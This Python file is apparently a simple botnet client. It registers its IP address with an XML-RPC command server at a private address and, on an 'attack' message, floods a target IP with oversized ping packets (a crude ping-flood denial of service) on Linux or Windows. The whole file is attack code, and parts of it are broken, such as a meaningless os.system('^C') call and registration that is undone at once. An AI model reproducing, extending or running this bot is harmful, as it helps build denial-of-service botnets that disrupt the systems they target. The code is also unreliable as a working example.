import os
import sys
import socket
import platform
import xmlrpc.client


def receiveCommand(message):
    """receive command from master"""
    if message["type"] == "attack":
        attackTarget(message)


def get_platform():
    """get botnet system platform"""
    return platform.system()


def attackTarget(message):
    if (get_platform().lower() == "linux"):
        os.system("ping "+message["target_ip"] + " -s 65500")
        if message["number_of_attack"] == -1:
            return
        os.system("^C")
    elif (get_platform().lower() == "windows"):
        os.system("ping "+message["target_ip"] +
                  " -l 65500 -n " + str(message["number_of_attack"]))
        if message["number_of_attack"] == -1:
            return


if __name__ == '__main__':
    s = xmlrpc.client.ServerProxy("http://192.168.1.5:8000")
    print(s.system.listMethods())
    ip_address = socket.gethostbyname(socket.gethostname())
    s.register_ip(ip_address)
    s.unregister_ip(ip_address)
